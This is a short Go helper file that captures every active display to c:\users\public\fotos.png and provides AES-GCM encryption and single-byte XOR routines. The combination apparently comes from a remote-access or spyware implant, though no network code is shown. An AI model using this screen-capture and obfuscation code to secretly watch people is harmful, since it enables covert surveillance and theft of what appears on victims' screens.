package helpers

import (
	"crypto/aes"
	"crypto/cipher"
	"github.com/kbinani/screenshot"
	"image/png"
	"os"
)

func GetScreenshot() {
	n := screenshot.NumActiveDisplays()

	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			panic(err)
		}
		fileName := "c:\\users\\public\\fotos.png"
		file, _ := os.Create(fileName)
		defer file.Close()
		png.Encode(file, img)
	}
}

func newAead(key []byte) (cipher.AEAD, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	aead, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	return aead, nil
}

func Encrypt(plain []byte, key, nonce []byte) []byte {
	aead, err := newAead(key)
	if err != nil {
		println(err.Error())
		return nil
	}

	return aead.Seal(plain[:0], nonce, plain, nil)
}

func Decrypt(cipher []byte, key, nonce []byte) []byte {
	aead, err := newAead(key)
	if err != nil {
		println(err.Error())
		return nil
	}

	output, err := aead.Open(cipher[:0], nonce, cipher, nil)
	if err != nil {
		println(err.Error())
		return nil
	}

	return output
}

func Xor(buf []byte, xorchar byte) []byte {
	res := make([]byte, len(buf))
	for i := 0; i < len(buf); i++ {
		res[i] = xorchar ^ buf[i]
	}
	return res
}
